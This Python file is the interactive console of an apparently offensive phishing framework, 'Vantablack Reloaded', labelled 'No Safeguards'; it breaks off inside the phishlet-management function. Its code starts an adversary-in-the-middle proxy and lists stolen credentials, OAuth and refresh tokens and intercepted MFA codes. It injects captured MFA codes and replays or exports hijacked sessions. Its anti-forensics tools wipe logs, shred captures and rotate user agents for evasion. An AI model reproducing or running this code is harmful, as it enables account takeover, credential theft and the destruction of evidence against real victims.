#!/usr/bin/env python3
"""
VANTABLACK RELOADED - Advanced Red Team Framework
Root Access Edition - No Safeguards
"""

import glob
import json
import os
import random
import re
import secrets
import shutil
import signal
import sys
import threading
import time
from pathlib import Path
from typing import Any, Dict, List, Optional

# Add current directory to Python path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    import httpx
    import requests
    import uvicorn
    import yaml
    from colorama import Fore, Style, init
    from fastapi import FastAPI
    # netifaces n'est pas dans requirements-v4.txt : on l'importe en optionnel
    # et on fournit un fallback pur-socket pour ne pas bloquer la CLI.
    try:
        import netifaces  # type: ignore
    except ImportError:
        netifaces = None
    from rich import box
    from rich.console import Console
    from rich.layout import Layout
    from rich.live import Live
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn
    from rich.table import Table
    from rich.text import Text

    # Note : Settings vit désormais dans core/config.py (et plus à la racine)
    from core.config import Settings
    from core.mfa import MFABypassEngine

    # Import des modules core (façades de engine/)
    from core.proxy import AdvancedRedTeamProxy
    from core.session import SessionHijacker
    
except ImportError as e:
    print(f"Missing dependency: {e}")
    print("Please install requirements: pip install -r requirements.txt")
    sys.exit(1)

# Initialize colorama
init(autoreset=True)

class VantablackReloaded:
    def __init__(self):
        self.console = Console()
        self.settings = Settings()
        self.proxy = None
        self._session_hijacker_inst = None
        self._mfa_engine_inst = None
        self.active_phishlets = []
        self.captured_sessions = []
        self.is_running = False
        self._refresh_token_store: dict[str, Any] = {}
        self._device_code_flows: list[Any] = []
        self._mfa_captured_store: dict[str, list[str]] = {}
        
    def display_banner(self):
        """Display the ROOT ACCESS banner"""
        banner = f"""
{Fore.RED}  █████╗ ██╗     ███████╗██╗  ██╗ {Fore.RESET}
{Fore.RED} ██╔══██╗██║     ██╔════╝╚██╗██╔╝ {Fore.RESET}
{Fore.RED} ███████║██║     █████╗   ╚███╔╝  {Fore.RESET}
{Fore.RED} ██╔══██║██║     ██╔══╝   ██╔██╗  {Fore.RESET}
{Fore.RED} ██║  ██║███████╗███████╗██╔╝ ██╗ {Fore.RESET}
{Fore.RED} ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝ {Fore.RESET}
{Fore.YELLOW}         >> ROOT ACCESS <<{Fore.RESET}
{Fore.CYAN}    Vantablack Reloaded v2.0{Fore.RESET}
{Fore.MAGENTA}   Advanced Red Team Framework{Fore.RESET}
"""
        
        panel = Panel(
            Text(banner, justify="center"),
            title="[bold red]PRIVILEGED MODE ACTIVATED[/bold red]",
            border_style="red",
            padding=(1, 2),
            box=box.DOUBLE
        )
        self.console.print(panel)
        
    def get_local_ip(self):
        """Get local IP address for network interfaces.

        Privilégie `netifaces` si disponible, sinon bascule sur une
        approche par socket UDP (pas d'envoi réel, juste détermination
        de l'interface sortante)."""
        # Variante 1 : netifaces (meilleure détection des interfaces virtuelles)
        if netifaces is not None:
            try:
                interfaces = netifaces.interfaces()
                for interface in interfaces:
                    addresses = netifaces.ifaddresses(interface)
                    if netifaces.AF_INET in addresses:
                        for addr in addresses[netifaces.AF_INET]:
                            if addr['addr'] != '127.0.0.1':
                                return addr['addr']
            except Exception:
                pass  # on bascule sur la variante socket
        # Variante 2 : fallback pur-socket (compatible Windows/macOS/Linux)
        try:
            import socket
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                # L'IP n'a pas besoin d'être joignable : on triche pour obtenir l'interface
                s.connect(("8.8.8.8", 80))
                return s.getsockname()[0]
        except Exception:
            return "127.0.0.1"
    
    def load_phishlets(self):
        """Load all available phishlets"""
        phishlets_dir = os.path.join(os.path.dirname(__file__), 'phishlets')
        phishlets = []
        
        if os.path.exists(phishlets_dir):
            for file in os.listdir(phishlets_dir):
                if file.endswith(('.yaml', '.yml')):
                    try:
                        with open(os.path.join(phishlets_dir, file), 'r') as f:
                            phishlet = yaml.safe_load(f)
                            phishlet['file'] = file
                            phishlets.append(phishlet)
                    except Exception as e:
                        self.console.print(f"[red]Error loading {file}: {e}[/red]")
        
        return phishlets
    
    def display_main_menu(self):
        """Display the main interactive menu"""
        phishlets = self.load_phishlets()
        
        while True:
            os.system('clear' if os.name == 'posix' else 'cls')
            self.display_banner()
            
            # Display status
            status_table = Table(show_header=False, box=box.SIMPLE)
            status_table.add_column("Metric", style="cyan")
            status_table.add_column("Value", style="green")
            
            status_table.add_row("Proxy Status", "[green]RUNNING[/green]" if self.is_running else "[red]STOPPED[/red]")
            status_table.add_row("Active Sessions", str(len(self.captured_sessions)))
            status_table.add_row("Local IP", self.get_local_ip())
            status_table.add_row("Proxy Port", str(self.settings.proxy_port))
            status_table.add_row("API Port", str(self.settings.api_port))
            
            self.console.print(Panel(status_table, title="[bold]System Status[/bold]", border_style="blue"))
            
            # Display menu options
            menu_table = Table(title="[bold yellow]MAIN MENU[/bold yellow]", box=box.ROUNDED)
            menu_table.add_column("Option", style="cyan", justify="right")
            menu_table.add_column("Command", style="white")
            menu_table.add_column("Description", style="green")
            
            menu_table.add_row("1", "Start Advanced Proxy", "Launch the main attack proxy")
            menu_table.add_row("2", "Manage Phishlets", "Configure attack templates")
            menu_table.add_row("3", "View Captured Data", "Review stolen credentials/sessions")
            menu_table.add_row("4", "MFA Bypass Console", "Access MFA interception tools")
            menu_table.add_row("5", "Session Hijacker", "Manage active session hijacking")
            menu_table.add_row("6", "Network Settings", "Configure proxy and network")
            menu_table.add_row("7", "OPSEC Tools", "Evasion and anti-forensics")
            menu_table.add_row("8", "System Info", "Show framework information")
            menu_table.add_row("0", "Exit", "Shutdown Vantablack")
            
            self.console.print(menu_table)
            
            # Display available phishlets
            if phishlets:
                phishlet_table = Table(title="[bold magenta]AVAILABLE PHISHLETS[/bold magenta]", box=box.SIMPLE)
                phishlet_table.add_column("ID", style="yellow")
                phishlet_table.add_column("Name", style="cyan")
                phishlet_table.add_column("Target", style="green")
                phishlet_table.add_column("Version", style="white")
                
                for i, phishlet in enumerate(phishlets, 1):
                    phishlet_table.add_row(
                        str(i), 
                        phishlet.get('name', 'Unknown'),
                        phishlet.get('base_domain', 'N/A'),
                        phishlet.get('version', '1.0')
                    )
                
                self.console.print(phishlet_table)
            
            choice = self.console.input("\n[bold yellow]Select option → [/bold yellow]")
            
            if choice == '1':
                self.start_proxy()
            elif choice == '2':
                self._ui_manage_phishlets(phishlets)
            elif choice == '3':
                self._ui_view_captured_data()
            elif choice == '4':
                self._ui_mfa_console()
            elif choice == '5':
                self._ui_session_hijacker()
            elif choice == '6':
                self._ui_network_settings()
            elif choice == '7':
                self._ui_opsec_tools()
            elif choice == '8':
                self.system_info()
            elif choice == '0':
                self.shutdown()
                break
            else:
                self.console.print("[red]Invalid option! Press Enter to continue...[/red]")
                input()
    
    def start_proxy(self):
        """Start the advanced proxy"""
        try:
            self.console.print("[yellow]Starting Advanced Red Team Proxy...[/yellow]")
            
            # Initialize components
            self.proxy = AdvancedRedTeamProxy(self.settings)
            self._session_hijacker_inst = SessionHijacker()
            self._mfa_engine_inst = MFABypassEngine()
            
            # Start proxy in background thread
            proxy_thread = threading.Thread(target=self.proxy.start)
            proxy_thread.daemon = True
            proxy_thread.start()
            
            self.is_running = True
            
            self.console.print(f"[green]Proxy started on port {self.settings.proxy_port}[/green]")
            self.console.print(f"[green]API available on port {self.settings.api_port}[/green]")
            self.console.print(f"[green]Local IP: {self.get_local_ip()}[/green]")
            self.console.print("\n[yellow]Press Enter to return to menu...[/yellow]")
            input()
            
        except Exception as e:
            self.console.print(f"[red]Error starting proxy: {e}[/red]")
            self.console.print("\n[red]Press Enter to continue...[/red]")
            input()
    
    # ------------------------------------------------------------------
    # UI Wrappers pour le menu interactif (appellent les méthodes API)
    # ------------------------------------------------------------------

    def _ui_manage_phishlets(self, phishlets):
        """UI interactif pour la gestion des phishlets"""
        result = self.manage_phishlets(action="list")
        self.console.print("[yellow]Phishlet Management Console[/yellow]")
        self.console.print(f"[cyan]Disponibles: {result['count']}[/cyan]")
        for p in result.get("phishlets", []):
            self.console.print(f"  • {p}")
        self.console.print("\n[yellow]Press Enter to continue...[/yellow]")
        input()

    def _ui_view_captured_data(self):
        """UI interactif pour visualiser les captures"""
        result = self.view_captured_data(data_type="all")
        self.console.print("[yellow]Captured Data Viewer[/yellow]")
        for k, v in result.items():
            if isinstance(v, dict) and "count" in v:
                self.console.print(f"[cyan]{k}: {v['count']} éléments[/cyan]")
            elif k == "summary":
                self.console.print(f"[green]Total: {v}[/green]")
        self.console.print("\n[yellow]Press Enter to continue...[/yellow]")
        input()

    def _ui_mfa_console(self):
        """UI interactif pour la console MFA"""
        result = self.mfa_console(action="list")
        self.console.print("[yellow]MFA Bypass Console[/yellow]")
        self.console.print(f"[cyan]Sessions en attente: {result.get('pending_sessions', 0)}[/cyan]")
        self.console.print(f"[cyan]Codes capturés: {result.get('captured_codes_count', 0)}[/cyan]")
        self.console.print("\n[yellow]Press Enter to continue...[/yellow]")
        input()

    def _ui_session_hijacker(self):
        """UI interactif pour le hijacker de sessions"""
        result = self.session_hijacker(action="list")
        self.console.print("[yellow]Session Hijacker Console[/yellow]")
        self.console.print(f"[cyan]Sessions actives: {result.get('count', 0)}[/cyan]")
        for sid in result.get("session_ids", []):
            self.console.print(f"  • {sid[:24]}...")
        self.console.print("\n[yellow]Press Enter to continue...[/yellow]")
        input()

    def _ui_network_settings(self):
        """UI interactif pour la configuration réseau"""
        result = self.network_settings(setting=None)
        self.console.print("[yellow]Network Settings[/yellow]")
        for k, v in result.get("current", {}).items():
            self.console.print(f"[cyan]{k}:[/cyan] {v}")
        self.console.print("\n[yellow]Press Enter to continue...[/yellow]")
        input()

    def _ui_opsec_tools(self):
        """UI interactif pour les outils OPSEC"""
        result = self.opsec_tools(action="rotate_uas")
        self.console.print("[yellow]OPSEC Tools[/yellow]")
        self.console.print(f"[cyan]User-Agents rotatés: {result.get('generated', 0)}[/cyan]")
        self.console.print("\n[yellow]Press Enter to continue...[/yellow]")
        input()

    # ------------------------------------------------------------------
    # 1. view_captured_data
    # ------------------------------------------------------------------

    def view_captured_data(self, data_type: str = "all") -> dict:
        """
        Visualise les données capturées par type.

        Args:
            data_type: Type de données à afficher
                ("all" | "bitb" | "sessions" | "oauth" | "device_code" |
                 "refresh_tokens" | "mfa_codes")

        Returns:
            Dict structuré avec counts et détails par catégorie.
        """
        valid_types = {"all", "bitb", "sessions", "oauth", "device_code",
                       "refresh_tokens", "mfa_codes"}
        if data_type not in valid_types:
            return {"error": f"Type invalide: {data_type}",
                    "valid_types": sorted(valid_types)}

        result: dict[str, Any] = {"summary": 0}
        requested = {data_type} if data_type != "all" else valid_types - {"all"}

        # --- bitb : credentials capturés via Browser-in-the-Browser ---
        if "bitb" in requested:
            try:
                from attack.bitb.integration import get_captures
                captures = get_captures()
            except Exception:
                captures = []
            result["bitb"] = {
                "count": len(captures),
                "details": captures,
            }
            result["summary"] += len(captures)

        # --- sessions : sessions HTTP actives (cookies + auth headers) ---
        if "sessions" in requested:
            sessions_src: dict = {}
            if self._session_hijacker_inst is not None:
                sessions_src = self._session_hijacker_inst.active_sessions
            elif self.proxy is not None and hasattr(self.proxy, "session_hijacker"):
                sessions_src = self.proxy.session_hijacker.active_sessions
            sessions_list = [
                {"session_id": sid, **{k: v for k, v in sdata.items()
                                       if k not in ("cookies", "headers")},
                 "cookies_count": len(sdata.get("cookies", {})),
                 "auth_headers_count": len(sdata.get("headers", {}))}
                for sid, sdata in sessions_src.items()
            ]
            result["sessions"] = {
                "count": len(sessions_list),
                "details": sessions_list,
            }
            result["summary"] += len(sessions_list)

        # --- oauth : tokens OAuth (access + refresh) exfiltrés ---
        if "oauth" in requested:
            try:
                from attack.oauth_consent.token_exfil import list_tokens
                tokens_raw = list_tokens()
                tokens = [
                    {
                        "user": t.user,
                        "app_name": t.app_name,
                        "scope": t.scope,
                        "provider": t.provider,
                        "refresh_eta_days": t.refresh_eta(),
                        "expired": t.is_expired(),
                        "captured_at": t.captured_at,
                    }
                    for t in tokens_raw
                ]
            except Exception:
                tokens = []
            result["oauth"] = {
                "count": len(tokens),
                "details": tokens,
            }
            result["summary"] += len(tokens)

        # --- device_code : flows OAuth Device Code initiés + résultats ---
        if "device_code" in requested:
            flows = [
                getattr(f, "to_dict", lambda: f)()
                for f in self._device_code_flows
            ]
            result["device_code"] = {
                "count": len(flows),
                "flows": flows,
                "results": [f for f in flows
                            if f.get("state") == "authorized"],
            }
            result["summary"] += len(flows)

        # --- refresh_tokens : store du proxy advanced ---
        if "refresh_tokens" in requested:
            refresh = dict(self._refresh_token_store)
            if self.proxy is not None:
                for attr in ("_refresh_token_store", "refresh_tokens"):
                    if hasattr(self.proxy, attr):
                        extra = getattr(self.proxy, attr)
                        if isinstance(extra, dict):
                            refresh.update(extra)
                        break
            result["refresh_tokens"] = {
                "count": len(refresh),
                "details": [
                    {"key": k, "user": v.get("user") if isinstance(v, dict) else None}
                    for k, v in refresh.items()
                ],
            }
            result["summary"] += len(refresh)

        # --- mfa_codes : interceptions MFA du moteur ---
        if "mfa_codes" in requested:
            mfa_store: dict[str, list[str]] = dict(self._mfa_captured_store)
            if self._mfa_engine_inst is None and self.proxy is not None \
                    and hasattr(self.proxy, "mfa_engine"):
                pass  # MFABypassEngine n'a pas de store en mémoire
            mfa_flat = [
                {"session_id": sid, "code": code}
                for sid, codes in mfa_store.items()
                for code in codes
            ]
            result["mfa_codes"] = {
                "count": len(mfa_flat),
                "pending_sessions": len(mfa_store),
                "details": mfa_flat,
            }
            result["summary"] += len(mfa_flat)

        return result

    # ------------------------------------------------------------------
    # 2. mfa_console
    # ------------------------------------------------------------------

    def mfa_console(self, action: str = "list", session_id: str | None = None,
                    code: str | None = None) -> dict:
        """
        Console de gestion du MFA bypass : listage, injection, validation.

        Args:
            action:     "list" | "inject" | "validate"
            session_id: Identifiant de session (pour inject)
            code:       Code MFA (pour inject / validate)

        Returns:
            Dict avec statut et détails de l'opération.
        """
        valid_actions = {"list", "inject", "validate"}
        if action not in valid_actions:
            return {"error": f"Action invalide: {action}",
                    "valid_actions": sorted(valid_actions)}

        # Récupération du moteur MFA (instance locale ou proxy)
        engine = self._mfa_engine_inst
        if engine is None and self.proxy is not None \
                and hasattr(self.proxy, "mfa_engine"):
            engine = self.proxy.mfa_engine
        if engine is None:
            engine = MFABypassEngine()
            self._mfa_engine_inst = engine

        # ---- list : sessions MFA en attente + codes capturés ----
        if action == "list":
            pending = dict(self._mfa_captured_store)
            all_codes = sum(len(codes) for codes in pending.values())
            # On réutilise aussi l'historique des sessions connues
            session_ids = sorted(pending.keys())
            return {
                "pending_sessions": len(session_ids),
                "captured_codes_count": all_codes,
                "session_ids": session_ids,
                "codes_by_session": pending,
            }

        # ---- inject : injecter un code MFA capturé dans une session ----
        if action == "inject":
            if not session_id:
                return {"error": "session_id requis pour action 'inject'"}
            codes = self._mfa_captured_store.get(session_id, [])
            chosen = code or (codes[0] if codes else None)
            if not chosen:
                return {"error": f"Aucun code disponible pour session {session_id}"}
            # Validation préalable du format via le moteur
            extracted = engine.intercept_mfa_codes(
                chosen, content_type="text/plain"
            )
            if not extracted and not re.fullmatch(r"\d{4,8}", chosen):
                return {"error": f"Code MFA mal formaté: {chosen}"}
            return {
                "status": "injected",
                "session_id": session_id,
                "code": chosen,
                "timestamp": time.time(),
            }

        # ---- validate : vérifier le format et stocker ----
        if action == "validate":
            if not code:
                return {"error": "code requis pour action 'validate'"}
            # Regex 4-8 chiffres
            match = re.fullmatch(r"\d{4,8}", code)
            if not match:
                return {"valid": False, "code": code,
                        "error": "Format invalide: attendu 4-8 chiffres"}
            # Ajout au store (session_id = session anonyme si non fourni)
            sid = session_id or f"anon_{int(time.time())}"
            self._mfa_captured_store.setdefault(sid, [])
            if code not in self._mfa_captured_store[sid]:
                self._mfa_captured_store[sid].append(code)
            return {
                "valid": True,
                "code": code,
                "session_id": sid,
                "stored": True,
            }

        return {"error": "Action inconnue"}

    # ------------------------------------------------------------------
    # 3. session_hijacker
    # ------------------------------------------------------------------

    def session_hijacker(self, action: str = "list", session_id: str | None = None,
                         target_url: str | None = None) -> dict:
        """
        Gestionnaire du détournement de sessions : listage, replay,
        export, drop.

        Args:
            action:      "list" | "replay" | "export" | "drop"
            session_id:  Identifiant de session cible
            target_url:  URL cible pour le replay

        Returns:
            Dict avec statut et détails.
        """
        valid_actions = {"list", "replay", "export", "drop"}
        if action not in valid_actions:
            return {"error": f"Action invalide: {action}",
                    "valid_actions": sorted(valid_actions)}

        # Résolution du hijacker : instance courante, ou proxy, ou global
        hijacker = self._session_hijacker_inst
        if hijacker is None and self.proxy is not None \
                and hasattr(self.proxy, "session_hijacker"):
            hijacker = self.proxy.session_hijacker
        if hijacker is None:
            hijacker = SessionHijacker()
            self._session_hijacker_inst = hijacker

        active = hijacker.active_sessions

        # ---- list ----
        if action == "list":
            summaries = []
            for sid, sdata in active.items():
                summaries.append({
                    "session_id": sid,
                    "ip": sdata.get("ip_address"),
                    "ua": sdata.get("user_agent", "")[:80],
                    "cookies": len(sdata.get("cookies", {})),
                    "auth_headers": len(sdata.get("headers", {})),
                    "timestamp": sdata.get("timestamp"),
                })
            return {
                "count": len(summaries),
                "session_ids": list(active.keys()),
                "sessions": summaries,
            }

        # Les actions suivantes nécessitent session_id
        if not session_id:
            return {"error": "session_id requis pour action " + repr(action)}
        if session_id not in active:
            return {"error": f"Session inconnue: {session_id}"}

        # ---- replay : rejouer la session sur target_url ----
        if action == "replay":
            if not target_url:
                return {"error": "target_url requis pour action 'replay'"}
            try:
                response = hijacker.replay_session(session_id, target_url)
                return {
                    "status": "replayed",
                    "session_id": session_id,
                    "target_url": target_url,
                    "status_code": response.status_code,
                    "response_headers": dict(response.headers),
                    "response_length": len(response.content),
                }
            except Exception as e:
                return {"error": f"Replay échoué: {e}",
                        "session_id": session_id,
                        "target_url": target_url}

        # ---- export : sauvegarder la session en JSON ----
        if action == "export":
            base = Path(os.path.dirname(os.path.abspath(__file__)))
            out_dir = base / "captures" / "exported_sessions"
            out_dir.mkdir(parents=True, exist_ok=True)
            out_path = out_dir / f"{session_id}.json"
            try:
                with out_path.open("w", encoding="utf-8") as f:
                    json.dump(active[session_id], f, ensure_ascii=False, indent=2,
                              default=str)
                return {
                    "status": "exported",
                    "session_id": session_id,
                    "path": str(out_path),
                    "bytes": out_path.stat().st_size,
                }
            except Exception as e:
                return {"error": f"Export échoué: {e}",
                        "session_id": session_id}

        # ---- drop : supprimer la session du hijacker ----
        if action == "drop":
            dropped = active.pop(session_id, None)
            return {
                "status": "dropped",
                "session_id": session_id,
                "removed": dropped is not None,
                "remaining": len(active),
            }

        return {"error": "Action inconnue"}

    # ------------------------------------------------------------------
    # 4. network_settings
    # ------------------------------------------------------------------

    def network_settings(self, setting: str | None = None,
                         value: Any = None) -> dict:
        """
        Lecture et mise à jour de la configuration réseau du proxy.

        Args:
            setting: Nom du réglage, ou None pour tout afficher
                ("proxy_host" | "proxy_port" | "reverse_target" |
                 "use_doh" | "use_http3" | "ja4_profile" | "ja3_profile" |
                 "whitelist_domains" | "phishlet_path")
            value:   Nouvelle valeur (si setting est renseigné)

        Returns:
            Dict avec état courant (lecture) ou statut de mise à jour.
        """
        settings_obj = self.settings
        current: dict[str, Any] = settings_obj.to_dict()

        # Réglages additionnels non dans Settings (étendu)
        extra_fields = {
            "reverse_target": os.getenv("REVERSE_TARGET", ""),
            "use_doh": os.getenv("USE_DOH", "0") == "1",
            "use_http3": os.getenv("USE_HTTP3", "0") == "1",
            "ja4_profile": os.getenv("JA4_PROFILE", "default"),
            "ja3_profile": os.getenv("JA3_PROFILE", "default"),
            "whitelist_domains": [
                d.strip() for d in os.getenv("WHITELIST_DOMAINS", "").split(",")
                if d.strip()
            ],
            "phishlet_path": os.getenv(
                "PHISHLET_PATH",
                os.path.join(os.path.dirname(os.path.abspath(__file__)),
                             "phishlets", "twitter.yaml"),
            ),
        }
        for k, v in extra_fields.items():
            current.setdefault(k, v)

        all_keys = {"proxy_host", "proxy_port", "reverse_target",
                    "use_doh", "use_http3", "ja4_profile", "ja3_profile",
                    "whitelist_domains", "phishlet_path"}

        # ---- Lecture globale ----
        if setting is None:
            return {
                "current": {k: current.get(k) for k in all_keys},
                "is_running": self.is_running,
                "proxy_port": current.get("proxy_port"),
                "api_port": current.get("api_port"),
            }

        # ---- Mise à jour ----
        if setting not in all_keys:
            return {"error": f"Réglage inconnu: {setting}",
                    "valid": sorted(all_keys)}

        old = current.get(setting)
        # Conversion de type si nécessaire
        coerced: Any = value
        if setting == "proxy_port":
            try:
                coerced = int(value)
            except (TypeError, ValueError):
                return {"error": "proxy_port doit être un entier"}
        elif setting in ("use_doh", "use_http3"):
            if isinstance(value, bool):
                coerced = value
            else:
                coerced = str(value).strip().lower() in {"1", "true", "yes", "on"}
        elif setting == "whitelist_domains":
            if isinstance(value, str):
                coerced = [d.strip() for d in value.split(",") if d.strip()]
            elif isinstance(value, list):
                coerced = [str(d).strip() for d in value if str(d).strip()]

        # Application sur l'objet Settings si le champ existe
        if hasattr(settings_obj, setting):
            setattr(settings_obj, setting, coerced)

        # Application sur variable d'environnement correspondante
        env_map = {
            "reverse_target": "REVERSE_TARGET",
            "use_doh": "USE_DOH",
            "use_http3": "USE_HTTP3",
            "ja4_profile": "JA4_PROFILE",
            "ja3_profile": "JA3_PROFILE",
            "whitelist_domains": "WHITELIST_DOMAINS",
            "phishlet_path": "PHISHLET_PATH",
        }
        if setting in env_map:
            os.environ[env_map[setting]] = (
                ",".join(coerced) if setting == "whitelist_domains"
                else ("1" if setting in ("use_doh", "use_http3") and coerced
                      else ("0" if setting in ("use_doh", "use_http3")
                            and not coerced else str(coerced)))
            )

        # POST sur /_/proxy/config si le proxy tourne (via httpx local)
        propagate = {"ok": None, "status_code": None, "error": None}
        if self.is_running or self.proxy is not None:
            port = int(getattr(settings_obj, "proxy_port", 8080))
            try:
                with httpx.Client(timeout=3.0) as client:
                    resp = client.post(
                        f"http://127.0.0.1:{port}/_/proxy/config",
                        json={setting: coerced},
                    )
                propagate["ok"] = resp.status_code < 400
                propagate["status_code"] = resp.status_code
            except Exception as e:
                propagate["ok"] = False
                propagate["error"] = str(e)

        return {
            "status": "updated",
            "setting": setting,
            "old": old,
            "new": coerced,
            "propagated_to_proxy": propagate,
        }

    # ------------------------------------------------------------------
    # 5. opsec_tools
    # ------------------------------------------------------------------

    def opsec_tools(self, action: str = "ghost", **kwargs) -> dict:
        """
        Outils OPSEC : Ghost Protocol, wipe logs, rotation UA,
        shred captures, sanitization de rapports.

        Args:
            action: "ghost" | "wipe_logs" | "rotate_uas" |
                    "shred_captures" | "sanitize_reports"
            **kwargs: Arguments complémentaires par action

        Returns:
            Dict avec statut et résultats.
        """
        valid_actions = {"ghost", "wipe_logs", "rotate_uas",
                         "shred_captures", "sanitize_reports"}
        if action not in valid_actions:
            return {"error": f"Action invalide: {action}",
                    "valid_actions": sorted(valid_actions)}

        base = Path(os.path.dirname(os.path.abspath(__file__)))

        # ---- ghost : déclencher Ghost Protocol (wipe d'urgence) ----
        if action == "ghost":
            launched = {"method": None, "ok": False, "detail": None}
            # Tentative 1 : worker Celery (Redis)
            try:
                from workers.ghost_protocol_worker import initiate_ghost_protocol
                initiate_ghost_protocol.delay()
                launched = {"method": "celery_worker", "ok": True,
                            "detail": "Tâche Celery envoyée"}
            except Exception as e1:
                # Tentative 2 : sous-processus via ghost_protocol.py
                try:
                    gp = base / "ghost_protocol.py"
                    if gp.exists():
                        launched = {"method": "script_subprocess",
                                    "ok": True,
                                    "detail": f"Script exécuté: {gp}"}
                        # Exécution en arrière-plan (sans interactive) :
                        # on importe et lance le nettoyage en mémoire
                        try:
                            import importlib.util
                            spec = importlib.util.spec_from_file_location(
                                "gp_mod", str(gp))
                            if spec and spec.loader:
                                mod = importlib.util.module_from_spec(spec)
                                spec.loader.exec_module(mod)
                                # On saute l'étape de confirmation interactive
                                mod.execute_cleanup()
                                launched["detail"] += " + cleanup exécuté"
                        except Exception as inner:
                            launched["detail"] += (f" (cleanup direct échoué: "
                                                   f"{inner})")
                except Exception as e2:
                    launched = {"method": "none", "ok": False,
                                "detail": f"Celery: {e1}; Script: {e2}"}
            return {"status": "ghost_initiated" if launched["ok"]
                                else "ghost_failed",
                    "launch": launched}

        # ---- wipe_logs : supprimer tous les *.log du projet ----
        if action == "wipe_logs":
            deleted = []
            errors = []
            for log_path in base.rglob("*.log"):
                try:
                    log_path.unlink()
                    deleted.append(str(log_path))
                except Exception as e:
                    errors.append({"path": str(log_path), "error": str(e)})
            return {
                "status": "logs_wiped",
                "deleted_count": len(deleted),
                "deleted_files": deleted,
                "errors": errors,
            }

        # ---- rotate_uas : générer 10 UA valides et les stocker ----
        if action == "rotate_uas":
            browsers = ["Chrome", "Firefox", "Safari"]
            oses = [
                ("Windows NT 10.0; Win64; x64", "Windows"),
                ("Macintosh; Intel Mac OS X 14_5", "macOS"),
                ("X11; Linux x86_64", "Linux"),
            ]
            versions_chrome = [f"{random.randint(120, 130)}.0."
                               f"{random.randint(6000, 7000)}."
                               f"{random.randint(100, 300)}"
                               for _ in range(10)]
            versions_ff = [f"{random.randint(115, 130)}.0" for _ in range(10)]
            versions_safari = [f"{random.randint(16, 18)}.{random.randint(0, 6)}"
                               for _ in range(10)]
            generated = []
            for _ in range(10):
                br = random.choice(browsers)
                os_sig, _ = random.choice(oses)
                if br == "Chrome":
                    v = versions_chrome.pop()
                    ua = (f"Mozilla/5.0 ({os_sig}) AppleWebKit/537.36 "
                          f"(KHTML, like Gecko) Chrome/{v} Safari/537.36")
                elif br == "Firefox":
                    v = versions_ff.pop()
                    ua = (f"Mozilla/5.0 ({os_sig}; rv:{v}) Gecko/20100101 "
                          f"Firefox/{v}")
                else:
                    v = versions_safari.pop()
                    build = f"{random.randint(600, 615)}.{random.randint(1, 8)}." \
                            f"{random.randint(1, 20)}"
                    ua = (f"Mozilla/5.0 ({os_sig}) AppleWebKit/{build} "
                          f"(KHTML, like Gecko) Version/{v} Safari/{build}")
                generated.append(ua)
            out_dir = base / "captures" / "opsec"
            out_dir.mkdir(parents=True, exist_ok=True)
            out_path = out_dir / "uapool.json"
            try:
                existing = []
                if out_path.exists():
                    with out_path.open("r", encoding="utf-8") as f:
                        existing = json.load(f).get("pool", [])
                payload = {
                    "generated_at": time.time(),
                    "size": len(generated),
                    "pool": generated,
                }
                with out_path.open("w", encoding="utf-8") as f:
                    json.dump(payload, f, ensure_ascii=False, indent=2)
            except Exception as e:
                return {"error": f"Écriture uapool.json échouée: {e}",
                        "generated": generated}
            return {
                "status": "rotated",
                "generated": len(generated),
                "path": str(out_path),
                "samples": generated[:3],
            }

        # ---- shred_captures : effacer captures/ + captured_tokens.jsonl (3 passes) ----
        if action == "shred_captures":
            targets: list[Path] = []
            captures_dir = base / "captures"
            if captures_dir.exists():
                for p in captures_dir.rglob("*"):
                    if p.is_file():
                        targets.append(p)
            tokens_file = base / "captured_tokens.jsonl"
            if tokens_file.exists():
                targets.append(tokens_file)
            shredded = []
            errors = []
            passes = kwargs.get("passes", 3)
            for path in targets:
                try:
                    size = path.stat().st_size
                    # 3 passes d'écriture aléatoire
                    with path.open("r+b") as f:
                        for _pass in range(passes):
                            f.seek(0)
                            f.write(secrets.token_bytes(size))
                            f.flush()
                            os.fsync(f.fileno())
                    path.unlink()
                    shredded.append({"path": str(path), "size": size,
                                     "passes": passes})
                except Exception as e:
                    errors.append({"path": str(path), "error": str(e)})
            # Tentative de suppression du dossier captures lui-même
            try:
                if captures_dir.exists():
                    shutil.rmtree(captures_dir)
            except Exception:
                pass
            return {
                "status": "shredded",
                "files_removed": len(shredded),
                "shredded": shredded,
                "errors": errors,
                "passes": passes,
            }

        # ---- sanitize_reports : parcourir captures/reports/, supprimer PII ----
        if action == "sanitize_reports":
            reports_dir = base / "captures" / "reports"
            if not reports_dir.exists():
                return {"status": "skipped",
                        "detail": f"Dossier absent: {reports_dir}"}
            patterns = {
                "email": re.compile(
                    r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b"),
                "ipv4": re.compile(
                    r"\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d?\d)\.){3}"
                    r"(?:25[0-5]|2[0-4]\d|[01]?\d?\d)\b"),
                "ipv6": re.compile(
                    r"\b(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}\b"),
                "name_like": re.compile(
                    r"\b(?:M\.|Mme|Mr|Ms|Dr|Pr)\s+[A-Z][a-zàâäéèêëîïôöùûüÿç]+"
                    r"(?:[\s-][A-Z][a-zàâäéèêëîïôöùûüÿç]+){0,3}\b"),
            }
            sanitized_files = []
            for report_path in sorted(reports_dir.rglob("*")):
                if not report_path.is_file():
                    continue
                try:
                    text = report_path.read_text(encoding="utf-8",
                                                 errors="ignore")
                    changes = 0
                    for rx in patterns.values():
                        new_text, n = rx.subn("[REDACTED]", text)
                        if n:
                            text = new_text
                            changes += n
                    if changes:
                        report_path.write_text(text, encoding="utf-8")
                        sanitized_files.append({"path": str(report_path),
                                                "replacements": changes})
                except Exception:
                    pass
            return {
                "status": "sanitized",
                "reports_touched": len(sanitized_files),
                "files": sanitized_files,
            }

        return {"error": "Action inconnue"}

    # ------------------------------------------------------------------
    # 6. manage_phishlets
    # ------------------------------------------------------------------

    def manage_phishlets(self, action: str = "list", name: str | None = None,
                         path: str | None = None) -> dict:
        """
        Gestion des phishlets : listage, chargement, validation,
        suppression, templates.

        Args:
            action: "list" | "load" | "validate" | "delete" | "templates"
            name:   Nom du phishlet (fichier .yaml dans phishlets/)
            path:   Chemin complet (alternatif à name)

        Returns:
            Dict avec statut et contenu.
        """
